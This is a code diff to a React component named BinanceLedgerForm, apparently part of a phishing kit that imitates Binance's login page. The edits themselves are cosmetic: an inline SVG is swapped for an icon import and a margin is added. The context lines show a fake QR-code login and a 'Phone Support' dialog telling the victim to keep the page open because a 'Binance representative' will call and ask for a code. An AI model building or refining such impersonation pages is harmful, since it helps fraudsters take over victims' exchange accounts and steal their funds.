@@ -1,6 +1,6 @@
 import { FC, useState, useEffect } from "react";
 import { useToast } from "@/hooks/use-toast";
-import { AlertTriangle } from "lucide-react";
+import { QrCode, AlertTriangle } from "lucide-react";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 
@@ -311,20 +311,10 @@ const BinanceLedgerForm: FC = () => {
                   aria-label="QR code login" 
                   tabIndex={0}
                 >
-                  <svg 
+                  <QrCode 
                     className="w-[24px] h-[24px]" 
                     style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-                    viewBox="0 0 24 24" 
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="currentColor"
-                  >
-                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
-                    <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
-                    <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
-                    <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
-                    <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
-                    <path d="M22.5 15.5V13H20v2.5h2.5z" />
-                  </svg>
+                  />
                 </div>
               </div>
             </div>
@@ -530,7 +520,7 @@ const BinanceLedgerForm: FC = () => {
                 <DialogHeader>
                   <DialogTitle className="text-white text-sm font-binance">Phone Support</DialogTitle>
                 </DialogHeader>
-                <div className="text-xs font-binance text-white leading-relaxed">
+                <div className="text-xs font-binance text-white leading-relaxed mb-4">
                   A Binance representative will contact you shortly. Please do not close this page. Our representative will ask for the following code: <strong className="text-yellow-400">7791</strong>
                 </div>
               </DialogContent>
